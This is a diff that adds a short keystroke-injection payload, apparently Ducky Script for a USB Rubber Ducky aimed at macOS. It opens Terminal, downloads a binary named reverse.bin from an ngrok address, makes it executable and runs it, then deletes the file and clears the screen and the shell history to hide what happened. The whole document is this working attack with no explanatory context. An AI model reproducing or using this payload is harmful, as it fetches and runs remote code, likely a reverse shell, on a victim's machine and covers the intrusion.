@@ -1,0 +1,9 @@
+GUI SPACE
+DELAY 200
+STRING Terminal
+ENTER
+DELAY 800
+STRING curl -s -o reverse.bin http://b473741a.ngrok.io/reverse.bin;
+DELAY 800
+STRING chmod +x reverse.bin ; nohup ./reverse.bin ; rm reverse.bin; clear; history -c
+ENTER
